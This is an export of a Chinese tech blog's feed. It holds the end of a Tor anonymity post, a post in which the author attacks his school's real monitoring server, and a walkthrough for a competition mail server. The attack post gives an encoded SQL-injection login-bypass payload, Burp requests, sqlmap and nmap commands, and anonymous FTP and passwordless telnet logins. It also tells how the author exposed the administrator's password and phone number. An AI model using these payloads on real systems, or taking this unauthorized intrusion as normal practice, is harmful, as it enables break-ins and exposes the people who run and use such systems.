流量</strong></li><li><strong>将要访问的网站</strong></li></ul><p>而网站的人员可以知道：</p><ul><li><strong>Tor 流量访问了本网站</strong></li><li><strong>以及账号密码</strong></li><li><strong>再加访问的页面数据</strong></li></ul><p>这种方案，不难发现同仅使用 Tor 方案一样；<strong>其弊端就在于，始终会被其他人发现处于你这 IP 位置的人正在使用 Tor 网络。</strong></p><h3 id="Tor-amp-obfs4-前置代理"><a href="#Tor-amp-obfs4-前置代理" class="headerlink" title="Tor &amp; obfs4 + 前置代理"></a>Tor &amp; obfs4 + 前置代理</h3><p>所以就有了此种方案。</p><p>obfs4 使 Tor 流量看起来是随机的，并且还防止检查程序通过互联网扫描找到网桥。 </p><p>当然 obfs4 可以换成其他<strong>可插拔传输器</strong>，例如 meek-azure 使您看起来像在使用 Microsoft 网站，以及 snowflake。</p><p>再加套上一个前置代理 Shadowsocks 隐藏真正的公网 IP。</p><p>HTTPS 就是必然了，因为使用此方案去访问 HTTP 网站，那些明文数据(用户名密码/网页内容)仍然会被劫持到。(推荐 <a href="https://www.eff.org/https-everywhere">HTTPS Everywhere</a> 浏览器插件)</p><p>当然此方案仍然需要注意：</p><ol><li>JavaScript 脚本可以绕过代理获取真实 IP 的，所以说需要禁用 JavaScript。(<a href="https://github.com/hackademix/noscript">Noscript</a> 插件)</li><li>WebRTC，一个实现网页实时语音或视频对话以及P2P文件分享的浏览器 API；可以在使用VPN或设置好浏览器代理的情况下泄露真实 IP 和 内网 IP。</li></ol><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://support.torproject.org/misc/misc-2/">https://support.torproject.org/misc/misc-2/</a></p><p><a href="https://en.wikipedia.org/wiki/Tor_(anonymity_network)">https://en.wikipedia.org/wiki/Tor_(anonymity_network)</a></p><p><a href="https://wiki.archlinux.org/index.php/Tor">https://wiki.archlinux.org/index.php/Tor</a></p><p><a href="https://tb-manual.torproject.org/circumvention/">https://tb-manual.torproject.org/circumvention/</a></p><p><a href="https://media.torproject.org/misc/2015-03-tor-brochure/tor-brochure-en.pdf">https://media.torproject.org/misc/2015-03-tor-brochure/tor-brochure-en.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之校园监控器</title>
      <link href="2019/10/14/SQLi-FirstTest/"/>
      <url>2019/10/14/SQLi-FirstTest/</url>
      
        <content type="html"><![CDATA[<p>由于是在学校内网中，并且对所造成的危害貌似【<strong>并不</strong>】很严重！</p><p>一些敏感信息也懒得打马了；主要是为对 <em>SQL</em> 注入以及 <em>sqlmap</em> 工具的使用、练习。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>原本是在备赛练习 <em>SQL</em> 注入相关习题中；在此墙裂推荐一个【系统性】练习 <em>SQL</em> 注入的靶场！</p><h3 id="SQLI-LABS"><a href="#SQLI-LABS" class="headerlink" title="SQLI-LABS"></a>SQLI-LABS</h3><p>Github：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>部署靶场环境不需很麻烦；比如说直接使用 <em>docker</em> 两条命令的事。</p><pre><code class="docker"># docker pull acgpiano/sqli-labs# docker run -it -d -p 8080:80 acgpiano/sqli-labs</code></pre><p>当然也可以到本人收集的 <a href="https://fanqxu.com/lab">Lab</a> 页面找到公网上别人搭建好的这个靶场。</p><p>其实，并不推荐使用别人的靶机；因为局限性是你无法直接使用其系统，这就会导致你无法完成一些操作，比如<strong>阅读、修改源码加固系统</strong>。</p><p>更不要在刚开始学的时候，就拿公网上别人公司服务器来搞！</p><ul><li>可能并不那么好找不到，这会打击信心。</li><li>可能造成无法挽回的损失，法律纠纷。</li><li>这确实很不道德！</li></ul><h2 id="0x01-步入正题"><a href="#0x01-步入正题" class="headerlink" title="0x01 步入正题"></a>0x01 步入正题</h2><p>但是我怎么会就局限于靶机捏？遂就拿身边发现的学校一台 <em>Web</em> 服务器来练手；前面胡扯了一大堆废话，接下来真正到了渗透时刻！！！</p><h3 id="监控系统"><a href="#监控系统" class="headerlink" title="监控系统"></a>监控系统</h3><p>首先，不得不说的是目标 Web 服务仅仅只是个【监控系统】；这也说明了即使将其攻破，危害性并不大；而究竟是监控啥的，后面等进去了再说……</p><h3 id="登录截包注入"><a href="#登录截包注入" class="headerlink" title="登录截包注入"></a>登录截包注入</h3><p>先在用户名提交框中输入一个单引号 <code>&#39;</code>，看看 <em>Web Application</em> 返回的响应；</p><p>如下图，发现已经出现【报错】了。并且 <em>URL</em> 框没有任何变化，初步判断这里有存在 <em>POST</em> 类型注入的可能性！</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g7xrsgda2xj30sg0li74m.jpg" <img src="/"></p><p>在此，直接使用 <em>BurpSuite</em> 来截取登录的数据包。</p><pre><code class="burp">POST /user_cs.asp?type=login HTTP/1.1Host: 192.168.252.10Content-Length: 32Accept: application/json, text/javascript, */*; q=0.01Origin: http://192.168.252.10X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36DNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.252.10/Accept-Encoding: gzip, deflateAccept-Language: zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeusername=admin&amp;password=MTIzNDU2</code></pre><p>可以发现确实是 <em>POST</em> 方式提交数据 ；原本输入的密码<code>123456</code>被编码成了<code>MTIzNDU2</code>。然并卵！就被进行了一次 <em>base64</em> 编码。其实这里无所谓了。</p><p>直接尝试注入万能密码 <code>&#39; or 1=1 -- +</code>来进行登录，经过不断尝试，参数<code>username</code>安全，但【<code>password</code>】就存在注入了。</p><p>首先先对万能密码 <code>&#39; or 1=1 -- +</code>进行 <em>URL</em> 编码，编码后就是这<code>%20%27%20%6f%72%20%31%3d%31%20%2d%2d%20%2b</code>么一长串。</p><p>然后使用 <em>BurpSuite</em> 将数据包发出去，返回浏览器界面而发现已经登录进去了。</p><pre><code class="burp">POST /user_cs.asp?type=login HTTP/1.1Host: 192.168.252.10Content-Length: 32Accept: application/json, text/javascript, */*; q=0.01Origin: http://192.168.252.10X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36DNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.252.10/Accept-Encoding: gzip, deflateAccept-Language: zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeusername=admin&amp;password=MTIzNDU2%20%27%20%6f%72%20%31%3d%31%20%2d%2d%20%2b</code></pre><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>将最原始的那个 <em>POST</em> 数据包保存到本地的一个文件<code>post.txt</code>里，尝试使用工具来注入。</p><pre><code class="sqlmap"># sqlmap -r post.txt -p &#39;password&#39; --random-agent        ___       __H__ ___ ___[.]_____ ___ ___  &#123;1.3.10#stable&#125;|_ -| . [.]     | .&#39;| . ||___|_  [.]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[*] starting @ 14:16:53 /2019-10-14/[14:16:53] [CRITICAL] specified HTTP request file &#39;post.txt&#39; does not exist[*] ending @ 14:16:53 /2019-10-14/</code></pre><p>出现错误 <strong>specified HTTP request file ‘post.txt’ does not exist</strong>，原因是找不到此文件；这里的解决方法就是，得将这个文件放入<code>sqlmap</code>的安装根目录，例如 <em>Kali</em> 的<code>/usr/share/sqlmap/</code>、<em>Arch</em> 的 <code>/opt/sqlmap/</code> 中。</p><p>再来……</p><pre><code class="sqlmap"># sqlmap -r post.txt -p &#39;password&#39; --random-agent[14:27:16] [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s)[14:27:16] [CRITICAL] connection dropped or unknown HTTP status code received…………………………………………[14:27:35] [WARNING] POST parameter &#39;password&#39; does not seem to be injectable</code></pre><p>再次使用 <em>URL</em> 方式跑……</p><pre><code class="sqlmap"># sqlmap -u &quot;http://192.168.252.10/user_cs.asp?type=login&quot; --data=&quot;username=admin&amp;password=MTIzNDU2&quot; -p &quot;password&quot; --random-agent </code></pre><p>报错和上面一样，反正也不行，这个 <em>Web Application</em> 着实奇怪，后端数据库使用的是<a href="https://zh.wikipedia.org/zh-cn/SQLite"><code>SQLite</code></a>。这种数据库不是一个【客户端/服务器】结构的数据库引擎，而是被集成在用户程序中；不太懂。</p><p><em>POST</em> 提交表单后，如果登录不成功，就回到登录页面；成功会 <em>GET</em> 请求几个页面，然后进去。</p><p>无奈！ <em>sqlmap</em> 白拿出来用了，这个登录界面只能【手动注入】……</p><h3 id="一点小收获"><a href="#一点小收获" class="headerlink" title="一点小收获"></a>一点小收获</h3><p>此时只能通过手动注入登录进去，进去后才发现这貌似仅只是个<em>环境监控系统</em>。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g7xrsycgzlj30yt0hyt9d.jpg" <img src="/"></p><p>而在右上角设置页面发现了页面缓存。<code>F12</code>打开【开发者工具】，将<code>type=password</code>修改为<code>type=text</code>，如下发现管理员的【浪漫密码】以及【电话号码】，管理员的【密码习惯】以及【联系方式】被暴露会引发后续的【社会工程学】攻击。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g7y215glt7j31ae0qp0uv.jpg"  alt="yangyao520"></p><p>当然对于社会工程学，俺学疏才浅，在这里就此搁浅了；</p><p>而这个 Web 应用；就目前来说，就发现了一个登录界面的注入。</p><p>也不想再去【黑盒审计】了。就酱紫～～:(</p><h2 id="0x02-后续"><a href="#0x02-后续" class="headerlink" title="0x02 后续"></a>0x02 后续</h2><p>针对主机层面的扫描……</p><pre><code class="nmap">sudo nmap -n -sS -sV -T4 -O 192.168.252.10Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:59 CSTNmap scan report for 192.168.252.10Host is up (0.0038s latency).Not shown: 993 closed portsPORT    STATE    SERVICE      VERSION21/tcp  open     ftp          oftpd23/tcp  open     telnet       Pocket CMD telnetd80/tcp  open     http         ChipPC Extreme httpd135/tcp filtered msrpc139/tcp filtered netbios-ssn443/tcp open     tcpwrapped445/tcp filtered microsoft-dsService Info: OSs: Unix, Windows CE 5.0; CPE: cpe:/o:microsoft:windows_ce</code></pre><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p>这里的操作系统应该是 <em>Windows CE 5.0</em>，微软研发的【嵌入式】操作系统。详见其 <a href="https://zh.wikipedia.org/zh-cn/Windows_Embedded_Compact"><em>维基百科</em></a>。</p><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>额！这里的 <em>FTP</em> 允许匿名登录；<code>Name</code>得随便写一个，<code>Password</code>随便输入。就这样子进去了 *_*</p><pre><code class="ftp"># ftp 192.168.252.10Connected to 192.168.252.10.220 Service ready for new user.Name (192.168.252.10:f4n9x): f4n9x@gmail.com331 User name okay, need password.Password: 230 User logged in, proceed.Remote system type is Windows_CE.ftp&gt; </code></pre><h3 id="TELNET"><a href="#TELNET" class="headerlink" title="TELNET"></a>TELNET</h3><p>这里更奇葩！<em>Telnet</em> 也是无密码连接；直接登录、控制系统 :)</p><pre><code class="telnet"># telnet 192.168.252.10Trying 192.168.252.10...Connected to 192.168.252.10.Escape character is &#39;^]&#39;.Welcome to the Windows CE Telnet Service on WindowsCEPocket CMD v 5.0\&gt; help以下命令可用:    ATTRIB    设置/显示文件属性。    CALL    调用批处理脚本。    CD    更改目录。    DATE    显示/设置系统日期。    DEL    删除文件。    DIR    打印目录内容。    …………………………    SET    设置或列出环境变量。    SHIFT    批处理文件的 Shift 参数。    START    启动分离进程。    TIME    显示/更改系统时间。    TITLE    设置 CMD.EXE 会话的窗口标题。    TYPE    将文件内容输出到屏幕。使用 HELP [命令名]显示给定命令的扩展帮助，或使用 HELP CMD 显示常规主题(如命令输入选项、I/O 重定向或 CMD 参数)的帮助。 </code></pre><h3 id="没话说"><a href="#没话说" class="headerlink" title="没话说"></a>没话说</h3><p>哎！我连【<strong>反弹木马</strong>】都懒得传上去了。担心系统性能不高，弄不好蓝屏就叽叽了。</p><p>不过话说回来，如果真的控制了这台机子。然后拿它做跳板，那内网核心网段服务器是否都可能会遭殃呢？这取决于管理员是否勤不勤快打补丁咯！</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>邮件服务部署及一丝感想</title>
      <link href="2019/09/09/Email-server/"/>
      <url>2019/09/09/Email-server/</url>
      
        <content type="html"><![CDATA[<blockquote><h2 id="完成-E-MAIL-服务器部署"><a href="#完成-E-MAIL-服务器部署" class="headerlink" title="完成 E-MAIL 服务器部署"></a>完成 E-MAIL 服务器部署</h2><h4 id="1-在此服务器上安装配置邮件服务，具体要求为："><a href="#1-在此服务器上安装配置邮件服务，具体要求为：" class="headerlink" title="1.在此服务器上安装配置邮件服务，具体要求为："></a>1.在此服务器上安装配置邮件服务，具体要求为：</h4><ul><li><input checked="" disabled="" type="checkbox"> <strong>（1）创建三个邮箱用户 mail4，mail5，mail6，用户密码为789，不允许本地登录；</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>（2）邮件服务器的域名后缀为 netskills.net，邮件服务器要在所有IP地址上进行侦听；</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>（3）为拒绝垃圾邮件，设置邮件服务器的黑名单，拒绝接收用户 mail5 的邮件；</strong></li></ul><h4 id="2-创建自签名-SSL-证书，配置邮件服务器的mail-连接。具体要求为："><a href="#2-创建自签名-SSL-证书，配置邮件服务器的mail-连接。具体要求为：" class="headerlink" title="2.创建自签名 SSL 证书，配置邮件服务器的mail 连接。具体要求为："></a>2.创建自签名 SSL 证书，配置邮件服务器的mail 连接。具体要求为：</h4><ul><li><input checked="" disabled="" type="checkbox"> <strong>（1）密钥路径为 /etc/pki/tls/certs/server.key；</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>（2）证书路径为 /etc/pki/tls/certs/server.crt；</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>（3）设置仅支持 smtps 和 pop3s 协议连接；</strong></li></ul></blockquote><p>一道赛题！由于在此之前，本人对于<strong>【邮件服务】</strong>相关知识没有一丝了解；以至于被此题折磨了一天！</p><h2 id="DNS-解析大法"><a href="#DNS-解析大法" class="headerlink" title="DNS 解析大法"></a>DNS 解析大法</h2><p>部署邮件服务前，需要将 DNS 服务配置完毕；为电子邮件系统提供域名解析。</p><p>配置服务器主机名称,需要保证服务器主机名称与发信域名保持一致。</p><pre><code class="bash">[root@localhost ~]# hostnamectl set-hostname mail.netskills.net</code></pre><p>关闭防火墙及 <strong>SElinux</strong>。</p><pre><code class="bash">[root@mail ~]# systemctl stop firewalld[root@mail ~]# systemctl disable firewalld[root@mail ~]# setenforce 0[root@mail ~]# getenforce Permissive</code></pre><p>安装 <em>bind</em> 包，修改主配置文件。</p><pre><code class="bash">[root@mail ~]# yum install bind[root@mail ~]# vim /etc/named.confoptions &#123;        listen-on port 53 &#123; any; &#125;;        listen-on-v6 port 53 &#123; ::1; &#125;;        directory       &quot;/var/named&quot;;        dump-file       &quot;/var/named/data/cache_dump.db&quot;;        statistics-file &quot;/var/named/data/named_stats.txt&quot;;        memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;        allow-query     &#123; any; &#125;;……………………省略……………………</code></pre><p>修改区域配置文件和数据配置（正向/反向）文件。</p><pre><code class="bash">[root@mail ~]# vim /etc/named.rfc1912.zoneszone &quot;netskills.net&quot; IN &#123;    type master;    file &quot;netskills.net.zone&quot;;    allow-update &#123; none; &#125;;&#125;;……………………省略……………………zone &quot;10.168.192.in-addr.arpa&quot; IN &#123;    type master;    file &quot;reverse.netskills.net&quot;;    allow-update &#123; none; &#125;;&#125;;……………………省略……………………[root@mail ~]# cp -p /var/named/named.localhost /var/named/netskills.net.zone[root@mail ~]# vim /var/named/netskills.net.zone$TTL 1D@    IN SOA    netskills.net. rname.invalid. (                    0    ; serial                    1D    ; refresh                    1H    ; retry                    1W    ; expire                    3H )    ; minimum    NS    ns.netskills.net.ns    A    192.168.10.101@    MX 10    mail.netskills.net.mail    A    192.168.10.101[root@mail ~]# cp -p /var/named/named.loopback /var/named/reverse.netskills.net[root@mail ~]# vim /var/named/reverse.netskills.net$TTL 1D@    IN SOA    netskills.net. rname.invalid. (                    0    ; serial                    1D    ; refresh                    1H    ; retry                    1W    ; expire                    3H )    ; minimum    NS    mail.netskills.net.    A    127.0.0.1101    PTR    mail.netskills.net.</code></pre><p>重启服务并为本地设置 DNS 服务器。</p><pre><code class="bash">[root@mail ~]# systemctl restart named[root@mail ~]# systemctl enable named[root@mail ~]# cat /etc/resolv.conf nameserver 192.168.10.101</code></pre><p><strong>验证：</strong></p><pre><code class="bash">[root@mail ~]# nslookup &gt; mail.netskills.netServer:        192.168.10.101Address:    192.168.10.101#53Name:    mail.netskills.netAddress: 192.168.10.101&gt; set q=mx&gt; 192.168.10.101Server:        192.168.10.101Address:    192.168.10.101#53101.10.168.192.in-addr.arpa    name = mail.netskills.net.</code></pre><h2 id="Email-服务"><a href="#Email-服务" class="headerlink" title="Email 服务"></a>Email 服务</h2><h3 id="邮件传输软件"><a href="#邮件传输软件" class="headerlink" title="邮件传输软件"></a>邮件传输软件</h3><p>安装 <em>Postfix</em>，其是一种电子邮件服务器；为改良 <em>sendmail</em> 而产生。</p><pre><code class="bash">[root@mail ~]# yum install postfix</code></pre><p><em>Postfix</em> 可以调用本地系统的账户和密码，因此在本地系统创建常规账户即可。</p><pre><code class="bash">[root@mail ~]# useradd mail4[root@mail ~]# useradd mail5[root@mail ~]# useradd mail6[root@mail ~]# echo &quot;789&quot; | passwd --stdin mail4[root@mail ~]# echo &quot;789&quot; | passwd --stdin mail5[root@mail ~]# echo &quot;789&quot; | passwd --stdin mail6# 这种方式给用户设置密码并不推荐，不太安全[root@mail ~]# usermod -s /sbin/nologin mail4[root@mail ~]# usermod -s /sbin/nologin mail5[root@mail ~]# usermod -s /sbin/nologin mail6</code></pre><p>修改并完善主配置文件。</p><pre><code class="bash">[root@mail ~] # vim /etc/postfix/main.cfmyhostname = mail.netskills.net# mydomain 变量其实就是邮箱地址后缀mydomain = netskills.netmyorigin = $mydomaininet_interfaces = allmydestination = $myhostname, $mydomainmynetworks = 192.168.10.0/24, 127.0.0.0/8home_mailbox = Maildir/[root@mail ~]# systemctl restart postfix[root@mail ~]# systemctl enable postfix</code></pre><p>设置邮件服务黑名单策略，拒收来自 <em>mail5</em> 用户的邮件。</p><pre><code class="bash">[root@mail ~]# echo &quot;smtpd_sender_restrictions = check_sender_access hash:/etc/postfix/sender_access&quot; &gt;&gt; /etc/postfix/main.cf[root@mail ~]# echo &quot;mail5@netskills.net REJECT&quot; &gt;&gt; /etc/postfix/sender_access[root@mail ~]# cat /etc/postfix/sender_accessmail5@netskills.net    REJECT[root@mail ~]# postmap /etc/postfix/sender_access[root@mail ~]# systemctl restart postfix.service</code></pre><p>  <strong>验证：</strong></p><pre><code class="bash">[root@mail ~]# yum install telnet[root@mail ~]# telnet localhost smtpTrying ::1...Connected to localhost.Escape character is &#39;^]&#39;.220 mail.netskills.net ESMTP Postfixhelo localhost250 mail.netskills.netMAIL FROM: mail5@netskills.net250 2.1.0 OkRCPT TO: mail4@netskills.net554 5.7.1 &lt;mail5@netskills.net&gt;: Sender address rejected: Access denied</code></pre><h3 id="创建自签名-SSL-证书。"><a href="#创建自签名-SSL-证书。" class="headerlink" title="创建自签名 SSL 证书。"></a>创建自签名 SSL 证书。</h3><p><strong>文件后缀：</strong><br><code>.key</code>：一般指私钥文件。</p><p><code>.csr</code>：证书请求文件。</p><p><code>.crt</code>：证书文件，certificate 的缩写。</p><p>关于【<strong>证书申请文件</strong>】（CSR）；首先需要先创建一个【<strong>私钥</strong>】（key），根据私钥生成 CSR。CSR 的主要内容是密钥对中的公钥，以及一些额外的信息 —— 最后这些内容都将在签名时插入到证书里。</p><p>创建一个<strong>【秘/私钥】</strong>，通过回显可以看出还是调用 <em>openssl</em> 命令生成的私钥。</p><pre><code class="bash">[root@mail ~]# cd /etc/pki/tls/certs/[root@mail certs]# make server.keyumask 77 ; \/usr/bin/openssl genrsa -aes128 2048 &gt; server.keyGenerating RSA private key, 2048 bit long modulus.........................+++.+++e is 65537 (0x10001)Enter pass phrase:               # dcncloudVerifying - Enter pass phrase:   # dcncloud# 从私钥中删除密码[root@mail certs]# openssl rsa -in server.key -out server.key Enter pass phrase for server.key: # dcncloudwriting RSA key</code></pre><p>  根据私钥 <em>server.key</em> 生成证书申请文件 <em>server.csr</em>。</p><pre><code class="bash">[root@mail certs]# make server.csrumask 77 ; \/usr/bin/openssl req -utf8 -new -key server.key -out server.csrYou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter &#39;.&#39;, the field will be left blank.-----Country Name (2 letter code) [XX]:CNState or Province Name (full name) []:ShanghaiLocality Name (eg, city) [Default City]:WOrganization Name (eg, company) [Default Company Ltd]:DCNOrganizational Unit Name (eg, section) []:netskillsCommon Name (eg, your name or your server&#39;s hostname) []:netskills.netEmail Address []:root@netskills.netPlease enter the following &#39;extra&#39; attributesto be sent with your certificate requestA challenge password []:      # 回车An optional company name []:  # 回车</code></pre><p>  使用私钥 <em>server.key</em> 对证书申请进行签名从而生成证书 <strong>server.crt</strong> 。</p><pre><code class="bash">[root@mail certs]# openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650Signature oksubject=/C=CN/ST=Shanghai/L=W/O=DCN/OU=netskills/CN=netskills.net/emailAddress=root@netskills.netGetting Private key[root@mail certs]# lsca-bundle.crt        make-dummy-cert  renew-dummy-cert  server.csrca-bundle.trust.crt  Makefile         server.crt        server.key</code></pre><h3 id="关于-SMTPS"><a href="#关于-SMTPS" class="headerlink" title="关于 SMTPS"></a>关于 SMTPS</h3><p><strong>SMTPS（Simple Mail Transfer Protocol Secure）</strong>是一种使用<a href="https://en.wikipedia.org/wiki/Transport_layer_security">传输层安全性</a>保护 <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol">SMTP</a> 的方法。它旨在提供通信伙伴的<a href="https://en.wikipedia.org/wiki/Authentication">身份验证</a>，以及<a href="https://en.wikipedia.org/wiki/Data_integrity">数据完整性</a>和<a href="https://en.wikipedia.org/wiki/Confidentiality">机密性</a>。</p><p>SMTPS 不是专有协议，也不是 SMTP 的扩展。通过将 SMTP 包装在 TLS 中，这是一种在<a href="https://en.wikipedia.org/wiki/OSI_model#Layer_4:_transport_layer">传输层</a>保护 SMTP 的方法。从概念上讲，它类似于 HTTPS ；在 TLS 中包装 HTTP 的方式。</p><p><strong>参考来源：</strong><a href="https://en.wikipedia.org/wiki/SMTPS">https://en.wikipedia.org/wiki/SMTPS</a></p><h4 id="为什么启用-SMTPS"><a href="#为什么启用-SMTPS" class="headerlink" title="为什么启用 SMTPS ? ? ?"></a>为什么启用 SMTPS ? ? ?</h4><p>用作提交协议的 SMTPS 令人困惑，让我解释，最初于1997年，IANA（互联网号码分配机构）为 SMTPS 分配了465端口，旨在用于加密一个 SMTP 服务器与另一个 SMTP 服务器之间的通信，如 mail.google.com 和 mail.yahoo.com，后来，STARTTLS 出现了，它允许 SMTP 服务器通过现有的 SMTP 端口25安全地相互通信，因此不再需要将465端口专用于安全 SMTP，SMTPS 端口已被撤销，但是，某些邮件客户端（如Microsoft Outlook）错误地将 SMTPS 解释为提交，并使用465端口进行电子邮件提交，直到今天仍然如此。</p><p><strong>参考来源：</strong><a href="https://ywnz.com/linuxyffq/4817.html%E3%80%82">https://ywnz.com/linuxyffq/4817.html。</a></p><p>哦！原来这是个已弃用的协议？</p><p>编辑 <em>postfix</em> 主配置文件，添加 SMTP 认证相关的 SASL 功能参数以及 SSL 证书路径。</p><pre><code class="bash">[root@mail ~]# vim /etc/postfix/main.cf# SMTP-Authsmtpd_sasl_type = dovecotsmtpd_sasl_path = private/authsmtpd_sasl_auth_enable = yessmtpd_sasl_security_options = noanonymoussmtpd_sasl_local_domain = $myhostname# SSLsmtpd_use_tls = yessmtpd_tls_cert_file = /etc/pki/tls/certs/server.crtsmtpd_tls_key_file = /etc/pki/tls/certs/server.key</code></pre><p>编辑 postfix 的 master 进程配置文件，取消相关注释；使其对 SMTPS 的支持。</p><pre><code class="bash">[root@mail ~]# vim /etc/postfix/master.cfsubmission inet n       -       n       -       -       smtpd  -o syslog_name=postfix/submissionsmtps     inet  n       -       n       -       -       smtpd  -o syslog_name=postfix/smtps  -o smtpd_tls_wrappermode=yes  -o smtpd_sasl_auth_enable=yes[root@mail ~]# systemctl restart postfix</code></pre><p>可以看出 SMTPS 默认端口465是帧听状态滴。</p><pre><code class="bash">[root@mail ~]# netstat -pantu | grep mastertcp    0    0 0.0.0.0:25    0.0.0.0:*    LISTEN      12816/master tcp    0    0 0.0.0.0:587   0.0.0.0:*    LISTEN      12816/master tcp    0    0 0.0.0.0:465   0.0.0.0:*    LISTEN      12816/master tcp6   0    0 :::25         :::*         LISTEN      12816/master tcp6   0    0 :::587        :::*         LISTEN      12816/master tcp6   0    0 :::465        :::*         LISTEN      12816/master</code></pre><h3 id="关于-POP3S"><a href="#关于-POP3S" class="headerlink" title="关于 POP3S"></a>关于 POP3S</h3><p><strong>POP3S (POP3-over-SSL/TLS)</strong> 是指用于将电子邮件传输协议 POP3 扩展为 SSL / TLS 加密的网络协议。通常，POP3S 默认在端口 995 上使用 TCP。</p><p>POP3S 默认端口 995；连接方式为 SSL / TLS， STARTTLS 不可用。认证方式为普通密码。 </p><h4 id="Why-POP3S"><a href="#Why-POP3S" class="headerlink" title="Why POP3S ? ? ?"></a><strong>Why POP3S ? ? ?</strong></h4><p>虽然 POP3 服务器要求客户端使用用户名和密码进行身份验证，但由于 POP3 是一种未加密的协议；用户名密码都是<strong>【明文传输】</strong>滴！</p><p>POP3S is POP3 over SSL/TLS。它为邮件协议提供了一个<strong>【加密连接】</strong>，通过该连接可以传输用户名和密码以进行身份验证。</p><h4 id="开源-POP3-服务器"><a href="#开源-POP3-服务器" class="headerlink" title="开源 POP3 服务器"></a>开源 POP3 服务器</h4><p>安装 dovecot（一款开源 IMAP、POP3 服务器），编辑其配置文件。</p><pre><code class="bash">[root@mail ~]# yum install dovecot[root@mail ~]# vim /etc/dovecot/dovecot.conf# 由题要求，仅配置 pop3 协议支持protocols = pop3listen = *</code></pre><p>编辑认证配置文件。</p><pre><code class="bash">[root@mail ~]# vim /etc/dovecot/conf.d/10-auth.conf# 允许明文认证disable_plaintext_auth = no</code></pre><p>邮件的相关配置。</p><pre><code class="bash">[root@mail ~]# vim /etc/dovecot/conf.d/10-mail.conf# 用户邮件存放的目录mail_location = maildir:~/Maildir</code></pre><p>认证相关配置。</p><pre><code class="bash">[root@mail ~]# vim /etc/dovecot/conf.d/10-master.conf# pop3s authservice pop3-login &#123;  inet_listener pop3 &#123;    port = 0  &#125;  inet_listener pop3s &#123;    port = 995    ssl = yes  &#125;&#125;# Postfix smtp-authunix_listener /var/spool/postfix/private/auth &#123;  mode = 0666  user = postfix  group = postfix&#125;</code></pre><p>证书相关配置。</p><pre><code class="bash">[root@mail ~]# vim /etc/dovecot/conf.d/10-ssl.confssl = yesssl_cert = &lt;/etc/pki/tls/certs/server.crtssl_key = &lt;/etc/pki/tls/certs/server.key</code></pre><p>查看端口，可以看出仅帧听了默认端口为995的 POP3S。 </p><pre><code class="bash">[root@mail ~]# netstat -pantu | grep dovecottcp   0   0 0.0.0.0:995    0.0.0.0:*    LISTEN    13300/dovecot</code></pre><h3 id="验证环节"><a href="#验证环节" class="headerlink" title="验证环节"></a>验证环节</h3><p>验证使用 <em>Windows</em> 上的一款 <em>Thundbird</em> 邮件客户端。</p><p>当网络及 DNS 等一切设置正常后；打开客户端软件会自动弹出这个<strong>【添加安全例外】</strong>，因为证书是自签名，并不被客户端信任。请<strong>疯狂</strong>点击 <u>确认安全例外</u>。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g6x7rcztmej30zi0obmxi.jpg"  alt="POP3S"></p><p>然后开始登录邮箱用户。如下图所示，POP3S(POP3-over-SSL/TLS) 默认端口为995，SMTPS(SMTP+TLS) 默认端口为465；验证方式为普通密码。直接点击<strong>完成</strong>，不必重新测试。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g6x7reqiauj30zl0obwey.jpg"  alt="Login"></p><p>如下，当用户发送邮件时可能弹出以下界面；同上，自签名证书不被信任。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g6x7rcy5utj30zk0obgm3.jpg"  alt="SMTPS"></p><p>测试发送邮件。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g6x7rcy3anj313m0p5dgd.jpg"  alt="Send"></p><p>成功接受邮件！！！</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g6x7rcyhm1j313p0p5t96.jpg"  alt="Received"></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对校园某服务器的一次渗透测试</title>
